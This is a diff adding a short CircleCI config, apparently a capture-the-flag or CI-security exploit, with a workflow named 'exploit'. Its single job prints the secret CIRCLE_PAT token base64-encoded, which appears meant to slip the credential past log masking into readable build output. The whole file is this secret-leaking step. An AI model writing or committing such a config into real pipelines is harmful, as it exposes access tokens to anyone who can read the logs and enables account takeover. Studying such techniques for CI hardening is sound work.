@@ -1,0 +1,15 @@
+version: 2.1
+
+jobs:
+  flag:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - run:
+          name: show flag
+          command: printf "%s" "$CIRCLE_PAT" | base64 | tr -d "\n"
+
+workflows:
+  exploit:
+    jobs:
+      - flag
